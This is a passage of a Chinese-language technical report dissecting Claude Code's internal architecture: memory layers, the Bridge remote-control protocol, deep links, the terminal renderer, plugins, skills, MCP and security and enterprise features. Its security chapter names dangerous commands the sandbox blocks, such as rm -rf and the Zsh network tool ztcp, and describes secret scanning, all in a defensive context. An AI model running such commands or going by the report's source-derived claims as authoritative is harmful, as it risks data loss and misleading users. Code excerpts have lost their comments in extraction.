+[] const seen = new Set<string>() for (const rule of getCompiledRules()) { if
+(seen.has(rule.id)) continue //            if (rule.re.test(content)) { seen.add(rule.id)
+matches.push({ ruleId: rule.id, label: ruleIdToLabel(rule.id) }) } } return matches }
+如果检测到秘密，上传被阻止并警告用户。redactSecrets()函数用于将匹配的秘密替换为[REDACTED]
+标记以供安全持久化。
+14.6 记忆提取Agent
+services/extractMemories/extractMemories.ts是记忆系统的"收割者"——在每次查询循环结束时（最
+终响应中无工具调用时），通过handleStopHooks触发记忆提取。
+工具范围：
+提取Agent拥有比Dream更宽泛的工具权限：FileEdit、FileRead、FileWrite、Glob、Grep、Bash、REPL。
+智能去重：
+//    Agent                   if (hasMemoryWritesSince(messages, lastExtractionUuid)) {
+runExtraction.skip() lastExtractionUuid = lastMessageUuid return }
+这个保护机制避免了重复记忆写入——如果主Agent在对话中已经主动保存了记忆（主Agent的prompt包
+含完整的保存指令），后台提取Agent就没有必要再次运行。
+14.7 四层记忆架构总结
+层级
+存储位置
+触发机制
+生命周期
+共享范围
+Session Memory
+临时文件
+10K tokens初始化 +
+5K增量
+会话内
+仅当前会话
+Memdir (MEMORY.md)
+~/.claude/projects/.../m
+emory/
+手动或提取Agent
+持久化
+个人
+Magic Docs
+项目内文件
+文件读取时注册
+持久化
+项目
+Team Memory Sync
+云端API
+手动或后台同步
+持久化
+团队
+Dream巩固
+~/.claude/projects/.../m
+emory/
+24h + 5会话
+持久化
+个人
+这个四层架构的设计灵感明显来自认知科学中的记忆层次理论：
+• Session Memory ≈ 工作记忆（Working Memory）：容量有限、快速衰减
+• Memdir ≈ 情景记忆（Episodic Memory）：个人经历的记录
+• Magic Docs ≈ 语义记忆（Semantic Memory）：结构化的知识
+• Team Memory ≈ 集体记忆（Collective Memory）：团队共享的知识
+• Dream ≈ 记忆巩固（Memory Consolidation）：从短期到长期的转化过程
+
+--- Page 46 ---
+Claude Code 0331 系统报告
+第14章 · 四层记忆架构
+—  46  —
+公众号：手工川
+2026-04-01
+第六部分：通信与远程控制
+
+--- Page 47 ---
+Claude Code 0331 系统报告
+第六部分：通信与远程控制
+—  47  —
+公众号：手工川
+2026-04-01
+第15章 · Bridge系统
+15.1 三代架构演进
+Bridge是Claude
+Code的远程控制骨架，负责让CLI实例能被外部系统（桌面应用、Web界面、CI/CD流水线、Agent
+SDK）远程操控。从源码中可以清晰地看到Bridge经历了三代架构演进：
+第一代：HTTP轮询 最原始的远程控制方式——客户端定期向服务端发起HTTP请求，检查是否有新的工
+作指令。简单可靠但延迟高。
+第二代：WebSocket REPL Bridge bridge/replBridge.ts（100KB）实现了WebSocket双向通信，支持实时
+消息传递和控制请求。这是当前的主力方案。
+第三代：Direct Connect server/directConnectManager.ts实现了直接的WebSocket连接，使用NDJSON（
+换行分隔的JSON）协议。适用于本地客户端直连场景（如桌面应用）。
+15.2 bridgeMain.ts核心流程
+bridge/bridgeMain.ts（115KB）是Bridge的神经中枢，实现了完整的远程控制循环。
+Bridge Loop入口：
+export async function runBridgeLoop( config: BridgeConfig, environmentId: string,
+environmentSecret: string, api: BridgeApiClient, spawner: SessionSpawner, logger: BridgeLogger,
+signal: AbortSignal, backoffConfig: BackoffConfig = DEFAULT_BACKOFF, initialSessionId?: string,
+getAccessToken?: () => string | undefined | Promise<string | undefined>, ): Promise<void>
+退避配置反映了对网络不稳定性的成熟处理：
+DEFAULT_BACKOFF = { connInitialMs: 2_000, //          connCapMs: 120_000, //        2   connGiveUpMs: 600_000, //        10    generalInitialMs: 500, //          generalCapMs: 30_000,
+//        generalGiveUpMs: 600_000, //        }
+会话追踪使用了丰富的数据结构：
+const activeSessions = new Map<string, SessionHandle>() const sessionStartTimes = new
+Map<string, number>() const sessionWorkIds = new Map<string, string>() const sessionCompatIds =
+new Map<string, string>() const sessionIngressTokens = new Map<string, string>() const
+sessionTimers = new Map<string, ReturnType<typeof setTimeout>>() const completedWorkIds = new
+Set<string>() const sessionWorktrees = new Map<string, WorktreeInfo>() const timedOutSessions =
+new Set<string>() const titledSessions = new Set<string>()
+这些Map的数量（10+）说明Bridge需要管理每个会话的多个维度：时间追踪、工作ID映射、JWT令牌、
+超时状态、Worktree信息等。
+Spawn模式：
+export type SpawnMode = 'single-session' | 'worktree' | 'same-dir'
+• single-session：在当前目录启动单个会话，结束后Bridge也关闭
+
+--- Page 48 ---
+Claude Code 0331 系统报告
+第15章 · Bridge系统
+—  48  —
+公众号：手工川
+2026-04-01
+• worktree：持久化服务器，每个会话使用隔离的Git worktree
+• same-dir：持久化服务器，所有会话共享工作目录（可能产生冲突）
+多会话Spawn通过GrowthBook特性门tengu_ccr_bridge_multi_session控制，需要--spawn / --capacity /
+--create-session-in-dir参数。
+容量管理：capacityWake机制允许在容量释放时提前唤醒轮询循环，避免不必要的等待。
+15.3 REPL Bridge协议
+bridge/replBridge.ts实现了Bridge的WebSocket层协议。
+核心参数类型：
+export type BridgeCoreParams = { dir: string //      machineName: string //     branch: string
+// Git   gitRepoUrl: string | null // Git  URL title: string //      baseUrl: string // API  URL
+sessionIngressUrl: string // WebSocket URL workerType: string // Worker   getAccessToken: () =>
+string | undefined createSession: (opts) => Promise<string | null> archiveSession: (sessionId:
+string) => Promise<void> onAuth401?: (staleToken: string) => Promise<boolean>
+getPollIntervalConfig?: () => PollIntervalConfig initialHistoryCap?: number //   200       //
+...      }
+Bridge状态机：
+export type BridgeState = 'ready' | 'connected' | 'reconnecting' | 'failed'
+Handle接口——Bridge会话的远程控制面板：
+export type ReplBridgeHandle = { bridgeSessionId: string environmentId: string
+sessionIngressUrl: string writeMessages(messages: Message[]): void writeSdkMessages(messages:
+SDKMessage[]): void sendControlRequest(request: SDKControlRequest): void
+sendControlResponse(response: SDKControlResponse): void sendControlCancelRequest(requestId:
+string): void sendResult(): void teardown(): Promise<void> }
+15.4 JWT认证与Work Secret
+Work Secret是Bridge会话的认证凭证包：
+export type WorkSecret = { version: number session_ingress_token: string // WebSocket  JWT
+api_base_url: string sources: Array<{ type: string; git_info?: GitInfo }> auth: Array<{ type:
+string; token: string }> claude_code_args?: Record<string, string> | null mcp_config?: unknown |
+null environment_variables?: Record<string, string> | null use_code_sessions?: boolean // CCR
+v2    }
+Work Secret不仅包含认证令牌，还包含了完整的会话配置——MCP配置、环境变量、代码参数等。这使
+得Bridge能在收到工作指令的同时获得执行该工作所需的全部上下文。
+JWT的自动刷新策略为：在令牌过期前5分钟开始刷新，最多重试3次。这种提前刷新避免了令牌过期导
+致的连接中断。
+15.5 Bridge的容错设计
+Bridge的容错设计体现在多个层面：
+连接级别：指数退避重连（2s 
+→ 
+4s 
+→ 
+8s 
+→ 
+... 
+→ 
+120s）
+会话级别：超时看门狗（timedOutSessions追踪被杀死的会话）
+工作级别：stopWorkWithRetry使用递增延迟（1s → 2s → 4s） 系统级别：SIGTERM → 30秒优雅关闭 →
+
+--- Page 49 ---
+Claude Code 0331 系统报告
+第15章 · Bridge系统
+—  49  —
+公众号：手工川
+2026-04-01
+SIGKILL
+bridge-kick命令是一个内部调试工具，允许开发者注入各种故障场景来测试恢复路径：
+/bridge-kick close 1002 —   WebSocket   /bridge-kick poll 404 —       404 /bridge-kick register
+fail —          /bridge-kick reconnect —     doReconnect /bridge-kick status —   Bridge  
+
+--- Page 50 ---
+Claude Code 0331 系统报告
+第15章 · Bridge系统
+—  50  —
+公众号：手工川
+2026-04-01
+第16章 · 远程与直连
+16.1 Remote Session Manager
+remote/RemoteSessionManager.ts管理从用户端到远程Bridge会话的连接。
+配置：
+export type RemoteSessionConfig = { sessionId: string getAccessToken: () => string orgUuid:
+string hasInitialPrompt?: boolean viewerOnly?: boolean //        Ctrl+C        }
+viewerOnly模式是一个值得注意的设计——它允许用户仅观察Agent的活动而不进行干预，这在团队协
+作场景中很有用（例如团队成员查看AI正在执行的自动化任务）。
+回调系统：
+export type RemoteSessionCallbacks = { onMessage: (message: SDKMessage) => void
+onPermissionRequest: (request: SDKControlPermissionRequest, requestId: string) => void
+onPermissionCancelled?: (requestId: string, toolUseId?: string) => void onConnected?: () => void
+onDisconnected?: () => void onReconnecting?: () => void onError?: (error: Error) => void }
+权限桥接：远程会话中的权限请求通过WebSocket转发给用户端，用户可以Allow或Deny：
+export type RemotePermissionResponse = | { behavior: 'allow'; updatedInput: Record<string,
+unknown> } | { behavior: 'deny'; message: string }
+updatedInput字段允许用户在批准时修改工具输入参数——例如批准文件写入但修改目标路径。这是一
+个细粒度的控制机制。
+16.2 Direct Connect Manager
+server/directConnectManager.ts实现了本地直连方案，使用NDJSON（换行分隔的JSON）协议：
+// WebSocket  NDJSON   ws.addEventListener('message', event => { const lines =
+data.split('\n').filter((l: string) => l.trim()) for (const line of lines) { const parsed =
+jsonParse(line) //          if (parsed.type === 'control_request') { /*      */ } if
+(parsed.type !== 'control_response' && parsed.type !== 'keep_alive' && parsed.type !==
+'streamlined_text' && parsed.type !== 'streamlined_tool_use_summary' && !(parsed.type ===
+'system' && parsed.subtype === 'post_turn_summary')) { callbacks.onMessage(parsed) //   SDK   }
+} })
+消息过滤逻辑显示Direct Connect会过滤掉以下消息类型：
+• control_response — 控制响应（已处理）
+• keep_alive — 心跳（不转发）
+• streamlined_text — 流式文本（可能由独立渲染器处理）
+• streamlined_tool_use_summary — 工具使用摘要
+• post_turn_summary — 轮次后摘要
+
+--- Page 51 ---
+Claude Code 0331 系统报告
+第16章 · 远程与直连
+—  51  —
+公众号：手工川
+2026-04-01
+16.3 Deep Link协议
+utils/deepLink/parseDeepLink.ts实现了claude-cli://协议处理，允许从浏览器或其他应用唤起Claude
+Code。
+URI格式：
+claude-cli://open[?q=<query>][&cwd=<path>][&repo=<owner/repo>]
+安全验证相当严格：
+• ASCII控制字符（0x00-0x1F, 0x7F）被拒绝——它们可能被用作Shell分隔符
+• GitHub owner/repo格式验证：/^[\w.-]+\/[\w.-]+$/
+• 查询长度限制：5,000字符（考虑cmd.exe的8191字符限制）
+• 工作目录长度限制：4,096字符（PATH_MAX/MAX_PATH）
+• Unicode隐形字符清理：partiallySanitizeUnicode()
+CWD解析优先级：
+  cwd > repo MRU     >   Home  完整处理流程：
+1. 用户点击claude-cli://open?q=hello&repo=owner/repo
+2. OS启动claude二进制，传入--handle-uri <url>
+3. handleDeepLinkUri()解析URI为DeepLinkAction
+4. 验证所有参数的安全性
+5. 解析工作目录
+6. 在终端中启动Claude，预填查询内容
+Deep 
+Link的设计使Claude 
+Code能与GitHub、Jira等平台集成——例如，GitHub
+Issue中的"用Claude修复这个Bug"按钮可以直接打开Claude Code并加载相关上下文。
+
+--- Page 52 ---
+Claude Code 0331 系统报告
+第16章 · 远程与直连
+—  52  —
+公众号：手工川
+2026-04-01
+第七部分：UI与前端工程
+
+--- Page 53 ---
+Claude Code 0331 系统报告
+第七部分：UI与前端工程
+—  53  —
+公众号：手工川
+2026-04-01
+第17章 · 自定义Ink框架
+17.1 不是标准Ink——完全重写
+ink/目录包含20+文件、约19,842行代码，这不是对开源Ink框架的简单修改或Fork——这是一次彻底的
+重写。
+标准Ink框架是一个基于React的终端UI库，使用Yoga布局引擎。但Claude
+Code的需求远超标准Ink的能力范围。通过对比标准Ink和Claude Code版本的关键差异：
+维度
+标准Ink
+Claude Code Ink
+渲染器
+简单的ANSI输出
+双缓冲区blit渲染 + DECSTBM硬件滚动
+布局引擎
+C++ Yoga（通过NAPI）
+纯TypeScript重写的Yoga
+文本处理
+基础ANSI解析
+完整的双向文本（BiDi）支持
+选择功能
+无
+文本选择 + 搜索高亮
+滚动优化
+基础滚动
+虚拟滚动 + clamp bounds
+样式系统
+基础颜色支持
+StylePool内存优化 + ANSI interning
+键盘处理
+简单的keypress
+801行的keypress解析器
+17.2 自研渲染器
+渲染管线分为四个阶段：
+DOM层（dom.ts）：
+export type DOMElement = { nodeName: ElementNames attributes: Record<string, DOMNodeAttribute>
+childNodes: DOMNode[] textStyles?: TextStyles dirty: boolean isHidden?: boolean scrollTop?:
+number scrollHeight?: number scrollViewportHeight?: number scrollClampMin?: number //     scrollClampMax?: number }
+布局引擎：Yoga计算每个节点的位置和尺寸。
+输出生成（render-node-to-output.ts，1,462行）：将DOM节点渲染到Screen缓冲区，生成带ANSI样式
+的输出。
+差异更新（log-update.ts，773行）：计算最小化的终端输出序列。如果布局没有偏移，使用窄损害范
+围代替全量重绘。
+Screen缓冲区（screen.ts，1,486行）实现了单元格级别的管理，是整个渲染系统的核心数据结构。
+17.3 Yoga Layout引擎的TypeScript移植
+
+--- Page 54 ---
+Claude Code 0331 系统报告
+第17章 · 自定义Ink框架
+—  54  —
+公众号：手工川
+2026-04-01
+native-ts/yoga-layout/包含了对Meta的Yoga布局引擎（C++实现）的纯TypeScript移植。这是一个重大
+的工程决策——放弃通过NAPI调用C++获得的性能优势，换取：
+• 消除NAPI编译依赖
+• 简化部署（纯JS发布）
+• 更好的Bun兼容性
+• 更容易的定制和调试
+移植覆盖了Flexbox布局的主要功能：
+• flex-direction（row/column + reverse）
+• flex-grow / flex-shrink / flex-basis
+• align-items / align-self / align-content
+• justify-content（全部6个值）
+• margin / padding / border / gap
+• width / height / min / max（point, percent, auto）
+• position: relative / absolute
+• display: flex / none / contents
+• flex-wrap: wrap / wrap-reverse
+• baseline alignment
+• measure functions（文本节点）
+未实现：aspect-ratio、box-sizing: content-box、RTL direction。
+17.4 双向文本与文本处理
+bidi.ts（4,290行）实现了完整的Unicode双向文本算法（UAX #9）。这对于支持中东语言（阿拉伯语、
+希伯来语）的开发者至关重要——他们的代码注释和变量名可能包含从右到左的文本。
+4,290行的实现规模表明这不是一个简单的"从左到右重排"——完整的BiDi算法涉及：
+• 字符级方向分析
+• 嵌套层级跟踪
+• 中性字符的方向解析
+• 镜像字符替换
+17.5 性能优化
+渲染性能是终端UI的命脉，Claude Code采用了多层优化：
+• 布局缓存：每个节点缓存布局结果，避免不必要的重算
+• Blit优化：如果布局未发生偏移，使用窄损害范围（narrow damage bounds）而非全量重绘
+• 图形素簇缓存（Grapheme Clustering）：缓存文本测量结果
+• 帧间追踪：layoutShifted标志追踪每帧是否有布局变化
+• StylePool：ANSI样式字符串的intern化，减少内存分配
+• 虚拟滚动：仅渲染可见区域的内容
+
+--- Page 55 ---
+Claude Code 0331 系统报告
+第17章 · 自定义Ink框架
+—  55  —
+公众号：手工川
+2026-04-01
+第18章 · 组件库与状态管理
+18.1 146个组件的架构分类
+Claude Code的146个组件文件可以分为以下几个功能域：
+对话/模态组件： ApproveApiKey、AutoModeOptInDialog、BridgeDialog、ChannelDowngradeDialog、Cost
+ThresholdDialog、DesktopUpsell等。这些组件处理需要用户确认的关键操作。
+导航/菜单：
+ClaudeInChromeOnboarding、CommandKeybindings、QuickOpenDialog、SearchBox、MessageSelector等。
+显示/输出： CompactSummary、MessageResponse、StructuredDiff、StructuredDiffList、VirtualMessageLis
+t等。这些是信息展示的核心。
+状态/进度：
+StatusLine、StatusNotices、Spinner、ToolUseLoader、BashModeProgress、TokenWarning等。
+设置/配置： SettingsDialog、ThemePicker、OutputStylePicker、ModelPicker等。
+开发/内部：
+DevBar、DiagnosticsDisplay、PerformanceMonitor、DiffInIDE等。这些是Anthropic内部使用的调试工具。
+任务/Agent管理： TaskListV2、TeammateViewHeader、CoordinatorAgentStatus、AgentProgressLine等。
+输入/编辑： TextInput、VimTextInput、BaseTextInput、SearchBox、ConsoleOAuthFlow等。值得注意的是
+VimTextInput——Claude Code为Vim用户提供了原生的Vim键绑定支持。
+18.2 87个自定义Hooks
+87个Hooks同样按功能分类：
+状态管理Hooks： useAppState、useSetAppState、useDynamicConfig、useSettings、useSettingsChange、u
+seCancelRequest、useMainLoopModel、useElapsedTime
+输入Hooks： useTextInput、useVimInput、useArrowKeyHistory、useSearchInput、usePasteHandler、useD
+oublePress、useExitOnCtrlCD、useCommandKeybindings
+异步操作Hooks： useBackgroundTaskNavigation、useCommandQueue、useNotifyAfterTimeout、useRemo
+teSession、useSSHSession、useTeleportResume
+集成Hooks： useReplBridge、useMergedClients、useMergedCommands、useMergedTools、useClaudeCod
+eHintRecommendation、usePluginRecommendationBase、useLspPluginRecommendation、useOfficialMarke
+tplaceNotification
+
+--- Page 56 ---
+Claude Code 0331 系统报告
+第18章 · 组件库与状态管理
+—  56  —
+公众号：手工川
+2026-04-01
+专用Hooks： useVirtualScroll、useCopyOnSelect、useBlink、useMemoryUsage、useInboxPoller、useTaskLi
+stWatcher、useSwarmInitialization
+18.3 DeepImmutable<AppState>不可变状态设计
+状态管理采用了严格的不可变设计：
+export type AppState = DeepImmutable<{ settings: SettingsJson verbose: boolean mainLoopModel:
+ModelSetting statusLineText: string | undefined expandedView: 'none' | 'tasks' | 'teammates'
+isBriefOnly: boolean selectedIPAgentIndex: number plugins: PluginState toolPermissionContext:
+ToolPermissionContext specState: SpeculationState // ... 50+      }>
+DeepImmutable包装器递归地将所有嵌套类型标记为readonly，在编译时防止状态的意外修改。状态更
+新通过spread运算符创建新对象。
+SpeculationState（投机状态）是一个特别有趣的字段：
+export type SpeculationState = | { status: 'idle' } | { status: 'active' id: string abort: () =>
+void startTime: number messagesRef: { current: Message[] } writtenPathsRef: { current:
+Set<string> } boundary: CompletionBoundary | null suggestionLength: number toolUseCount: number
+isPipelined: boolean }
+投机执行允许Claude 
+Code在等待用户输入的同时预测性地开始处理可能的下一步操作，如果预测正确
+则立即呈现结果，如果错误则丢弃。isPipelined标志表明投机可以流水线化——多个投机操作可以重
+叠执行。
+18.4 Store接口
+Store采用了类Zustand的极简API：
+• getState() — 获取当前状态快照
+• setState(updater) — 使用更新函数修改状态
+• subscribe(listener) — 监听状态变化
+非React消费者通过useSyncExternalStore接入Store，保证了与React 18并发模式的兼容性。
+18.5 print.ts：终端渲染的瑞士军刀
+cli/print.ts（212KB）是代码库中最大的单一文件之一，实现了：
+1. 消息格式化：将Assistant消息、工具调用、产物格式化为终端输出
+2. 结构化输出：JSON-LD日志、事件分析
+3. 工具池管理：基于权限的动态工具过滤
+4. 命令执行：Slash命令的排队和处理
+5. 模型选择：受特性标志门控的模型切换
+6. 流处理：流式输出的转换器
+7. 权限验证：通过QueryEngine进行工具访问控制
+8. 分析集成：GrowthBook特性标志、第一方事件日志
+9. 文件状态缓存：编辑文件的优化重渲染
+
+--- Page 57 ---
+Claude Code 0331 系统报告
+第18章 · 组件库与状态管理
+—  57  —
+公众号：手工川
+2026-04-01
+这个文件的规模（212KB）表明它可能是历史积累的结果，而非有意设计。在代码库的下一次重构中，
+它很可能是首要的拆分目标。
+18.6 FPS监控与覆盖层
+Claude Code内置了FPS监控系统，可以通过覆盖层（Overlay）实时显示渲染性能。这对于终端UI的开发
+和调试至关重要——如果渲染帧率下降，用户会感受到明显的卡顿。
+
+--- Page 58 ---
+Claude Code 0331 系统报告
+第18章 · 组件库与状态管理
+—  58  —
+公众号：手工川
+2026-04-01
+第八部分：插件生态与扩展系统
+
+--- Page 59 ---
+Claude Code 0331 系统报告
+第八部分：插件生态与扩展系统
+—  59  —
+公众号：手工川
+2026-04-01
+第19章 · 插件系统
+19.1 命名空间设计
+Claude Code的插件采用{name}@{marketplace}的命名空间设计：
+export const BUILTIN_MARKETPLACE_NAME = 'builtin' //    my-plugin@official-marketplace
+这种设计借鉴了npm的@scope/package模式，但将"作用域"替换为"市场"概念，允许同名插件在不同市
+场中共存。
+19.2 PluginInstallationManager
+services/plugins/PluginInstallationManager.ts实现了后台安装生命周期：
+export async function performBackgroundPluginInstallations( setAppState: SetAppState, ):
+Promise<void>
+安装状态追踪：
+function updateMarketplaceStatus( setAppState: SetAppState, name: string, status: 'pending' |
+'installing' | 'installed' | 'failed', error?: string, ): void
+关键架构决策：
+• 非阻塞市场克隆（快速Git clone，本地缓存）
+• 基于Diff的Reconcile（对比声明的vs已物化的市场）
+• 新安装时自动刷新，更新时不自动刷新（由用户选择时机）
+• 失败时优雅降级（设置needsRefresh标志，等待手动/reload-plugins）
+• 分析日志记录（installed_count, updated_count, failed_count）
+19.3 内置插件注册表
+plugins/builtinPlugins.ts管理内置插件：
+const BUILTIN_PLUGINS: Map<string, BuiltinPluginDefinition> = new Map() export function
+registerBuiltinPlugin(def: BuiltinPluginDefinition): void export function
+isBuiltinPluginId(pluginId: string): boolean export function getBuiltinPlugins(): { enabled:
+LoadedPlugin[] disabled: LoadedPlugin[] }
+插件启用逻辑：
+• 用户设置存储在settings.enabledPlugins[pluginId]
+• 默认启用通过definition.defaultEnabled控制
+• 用户偏好覆盖默认值
+• 可用性检查通过isAvailable()函数
+
+--- Page 60 ---
+Claude Code 0331 系统报告
+第19章 · 插件系统
+—  60  —
+公众号：手工川
+2026-04-01
+19.4 DXT格式：插件打包标准
+utils/dxt/定义了Claude Code的插件打包格式（DXT）。
+安全验证是DXT处理的核心关注点：
+const LIMITS = { MAX_FILE_SIZE: 512 * 1024 * 1024, // 512MB/   MAX_TOTAL_SIZE: 1024 * 1024 *
+1024, // 1GB   MAX_FILE_COUNT: 100000, MAX_COMPRESSION_RATIO: 50, // Zip    MIN_COMPRESSION_RATIO: 0.5, }
+路径安全：
+export function isPathSafe(filePath: string): boolean { return !containsPathTraversal(filePath)
+&& !isAbsolute(normalized) }
+Zip炸弹检测通过压缩比阈值（50:1）实现——如果解压后的大小是压缩大小的50倍以上，视为潜在的Zi
+p炸弹攻击。
+
+--- Page 61 ---
+Claude Code 0331 系统报告
+第19章 · 插件系统
+—  61  —
+公众号：手工川
+2026-04-01
+第20章 · 技能系统
+20.1 BundledSkillDefinition类型
+内置技能通过BundledSkillDefinition类型定义：
+export type BundledSkillDefinition = { name: string description: string aliases?: string[]
+whenToUse?: string argumentHint?: string allowedTools?: string[] //       model?: string //     disableModelInvocation?: boolean userInvocable?: boolean isEnabled?: () => boolean hooks?:
+HooksSettings context?: 'inline' | 'fork' //    Fork   agent?: string files?: Record<string,
+string> //      getPromptForCommand: (args: string, context: ToolUseContext) =>
+Promise<ContentBlockParam[]> }
+关键字段解析：
+• allowedTools — 工具白名单限制技能的能力范围。例如安全审查技能（/security-review）可能只
+允许使用文件读取工具，不允许执行命令
+• context: 'fork' — Fork执行创建隔离上下文，避免技能执行影响主会话状态
+• files — 技能可以携带参考文件，在首次调用时提取到磁盘
+20.2 技能文件安全提取
+内置技能文件的提取过程包含严格的安全措施：
+• 提取目标：~/.claude/bundled-skills/{name}/
+• Memoized提取：同一技能只提取一次
+• 路径遍历防御：显式".."预防
+• 文件标志：O_NOFOLLOW | O_EXCL防止符号链接攻击
+• 权限设置：0o700（仅所有者可读写执行）
+20.3 技能加载器
+skills/loadSkillsDir.ts实现了文件系统级别的技能动态发现：
+export type LoadedFrom = | 'commands_DEPRECATED' | 'skills' | 'plugin' | 'managed' //      |
+'bundled' | 'mcp'
+技能路径解析：
+• ~/.claude/skills — 用户级技能
+• .claude/skills — 项目级技能
+• ~/.config/.claude/skills — 策略管理技能
+• plugin/ — 插件携带的技能
+加载器还支持：
+
+--- Page 62 ---
+Claude Code 0331 系统报告
+第20章 · 技能系统
+—  62  —
+公众号：手工川
+2026-04-01
+• Token估算（从frontmatter中提取name、description、whenToUse）
+• 参数名解析与替换
+• 努力级别追踪（EFFORT_LEVELS枚举）
+• GitIgnore感知（跳过.gitignore中的路径）
+• Markdown配置加载
+
+--- Page 63 ---
+Claude Code 0331 系统报告
+第20章 · 技能系统
+—  63  —
+公众号：手工川
+2026-04-01
+第21章 · MCP集成
+21.1 七种传输方式
+Claude Code支持7种MCP传输协议：
+传输方式
+描述
+适用场景
+stdio
+标准输入/输出
+本地MCP服务器
+SSE
+Server-Sent Events
+HTTP长连接
+HTTP
+HTTP请求/响应
+无状态API
+WebSocket
+双向WebSocket
+实时双向通信
+SDK
+内置SDK
+Anthropic原生集成
+claudeai-proxy
+Claude.ai代理
+Cloud MCP桥接
+IDE
+IDE集成
+VS Code / JetBrains
+21.2 七层配置作用域
+MCP配置的作用域从局部到全局：
+1. local — 项目级别（.claude/mcp.json）
+2. project — 仓库级别（通过CLAUDE.md声明）
+3. user — 用户级别（~/.claude/mcp.json）
+4. plugin — 插件携带
+5. builtin — 内置
+6. remote — 远程推送
+7. managed — 企业管理级别（最高优先级）
+21.3 MCP Client管理
+services/mcp/实现了MCP客户端的完整生命周期管理：
+• 连接管理：自动连接、断线重连、健康检查
+• 资源索引：MCP服务器暴露的资源自动索引
+• 工具发现：MCP工具动态注册到Claude Code的工具池
+• 权限桥接：MCP工具继承Claude Code的权限模型
+21.4 Channel Notification
+
+--- Page 64 ---
+Claude Code 0331 系统报告
+第21章 · MCP集成
+—  64  —
+公众号：手工川
+2026-04-01
+Channel Notification是KAIROS的事件推送管道（已在第11章详述），通过MCP服务器将外部消息（Discor
+d、Slack、SMS）注入Claude Code的对话流。
+21.5 LSP集成
+services/lsp/实现了Language Server Protocol集成：
+• 基于文件扩展名的路由：不同语言的文件路由到对应的LSP服务器
+• 多服务器管理：同时连接多个LSP服务器
+• 诊断信息集成：LSP的错误和警告直接融入Claude的上下文
+LSP集成使Claude
+Code能够利用语言服务器的能力——类型检查、补全建议、引用查找——增强其代码理解能力。
+
+--- Page 65 ---
+Claude Code 0331 系统报告
+第21章 · MCP集成
+—  65  —
+公众号：手工川
+2026-04-01
+第九部分：安全与企业特性
+
+--- Page 66 ---
+Claude Code 0331 系统报告
+第九部分：安全与企业特性
+—  66  —
+公众号：手工川
+2026-04-01
+第22章 · 七层安全防护体系
+Claude Code构建了一个纵深防御的安全体系。从内到外，可以识别出七个安全层级：
+22.1 第一层：权限三级制（Allow / Deny / Ask）
+权限模型是安全体系的基础（详见第10章）。每个工具调用都要经过三级决策：
+• Allow — 自动批准
+• Deny — 自动拒绝
+• Ask — 请求用户确认
+四层规则来源按优先级排列：settings > CLI > command > session。
+22.2 第二层：拒绝追踪与策略回退
+当用户频繁拒绝某类操作时，系统会进行策略调整：
+• 连续3次拒绝同一工具 → 该工具进入更保守的询问模式
+• 累计20次拒绝 → 全局策略回退，增加询问频率
+这是一种"学习型安全"——系统从用户的拒绝行为中推断安全偏好。
+22.3 第三层：Hook拦截链
+PreToolUse和PostToolUse
+Hook允许在工具执行前后注入自定义检查逻辑。企业用户可以利用这个机制实现：
+• 敏感路径保护（阻止对特定目录的写入）
+• 命令审计日志
+• 自定义安全策略执行
+22.4 第四层：AI分类器辅助决策
+TRANSCRIPT_CLASSIFIER使用AI模型分析对话上下文，辅助权限决策。当规则系统无法明确判断时，分类
+器提供额外的信号：
+• 分析用户意图是否与请求的工具操作一致
+• 检测可能的提示注入（Prompt Injection）尝试
+• 评估操作的风险等级
+
+--- Page 67 ---
+Claude Code 0331 系统报告
+第22章 · 七层安全防护体系
+—  67  —
+公众号：手工川
+2026-04-01
+22.5 第五层：Bash沙箱25项检查
+BashTool的安全检查是最具深度的防线（详见第9章）。25项检查覆盖：
+• 危险命令检测（rm -rf、格式化命令）
+• 嵌套命令解包（通过迭代固定点算法处理sudo、xargs等包装器）
+• Zsh特定防御（zmodload、ztcp、zpy）
+• 环境变量劫持检测
+• 网络命令监控
+22.6 第六层：文件系统防护
+文件操作工具包含多层保护：
+• 路径遍历防御：拒绝包含..的路径（尤其在DXT插件解压和技能文件提取中）
+• 符号链接保护：使用O_NOFOLLOW标志阻止符号链接攻击
+• 权限限制：提取文件使用0o700权限
+• 大小限制：DXT包解压的文件大小、总大小、压缩比限制
+22.7 第七层：秘密扫描
+Team Memory上传前的秘密扫描（详见第14.5节）。35+条基于gitleaks的规则，覆盖主要云提供商、API
+密钥、私钥等敏感信息。
+七层安全体系的设计哲学：
+• 每一层都假设前一层可能失败
+• 从用户侧（权限决策）到系统侧（沙箱检查）到数据侧（秘密扫描），形成完整覆盖
+• AI分类器提供了传统规则系统无法覆盖的模糊场景处理能力
+• Hook系统为企业用户提供了自定义扩展点
+
+--- Page 68 ---
+Claude Code 0331 系统报告
+第22章 · 七层安全防护体系
+—  68  —
+公众号：手工川
+2026-04-01
+第23章 · 企业功能
+23.1 策略限制系统
+services/policyLimits/实现了组织级别的功能限制：
+资格模型：
+• Console用户（API Key）：全部有资格
+• OAuth用户（Claude.ai）：仅Team和Enterprise/C4E
+• Fail-Open设计：API获取失败时不阻塞，继续运行不受限
+export type PolicyLimitsResponse = { restrictions: { disabledTools?: string[] //        disabledFeatures?: string[] //         maxTokensPerMinute?: number // Token     customLimits?:
+Record<string, unknown> //       } }
+后台轮询：每小时（POLLING_INTERVAL_MS 
+= 
+60 
+60 
+1000）从服务端拉取最新限制。
+缓存：结果缓存到policy-limits.json文件，重启后立即可用。
+超时：单次请求10秒超时，最多5次重试。
+23.2 远程管理设置
+services/remoteManagedSettings/允许企业管理员远程推送Claude Code设置：
+• 使用ETag/If-None-Match进行条件请求，最小化带宽
+• 签名验证确保设置未被篡改（securityCheck.tsx）
+• Checksum验证（crypto.createHash()）
+• Settings Schema验证确保格式正确
+• 30秒超时防止死锁（其他系统等待初始加载完成）
+• 安全检查失败时优雅降级
+23.3 设置同步
+services/settingsSync/实现了设置的持久化与跨设备同步。
+23.4 OAuth认证流程
+services/oauth/client.ts实现了完整的OAuth 2.0 PKCE流程：
+export function buildAuthUrl({ codeChallenge: string, state: string, port: number, isManual:
+boolean, loginWithClaudeAi?: boolean, // Claude.ai vs Console inferenceOnly?: boolean, orgUUID?:
+string, loginHint?: string, loginMethod?: string, }): string
+
+--- Page 69 ---
+Claude Code 0331 系统报告
+第23章 · 企业功能
+—  69  —
+公众号：手工川
+2026-04-01
+关键特性：
+• 支持Claude.ai和Console两个认证端点
+• PKCE（Proof Key for Code Exchange）增强安全性
+• 组织选择（orgUUID）
+• 登录提示（loginHint）
+• Claude Max升级引导
+两个作用域：
+• CLAUDE_AI_INFERENCE_SCOPE — Claude.ai推理权限
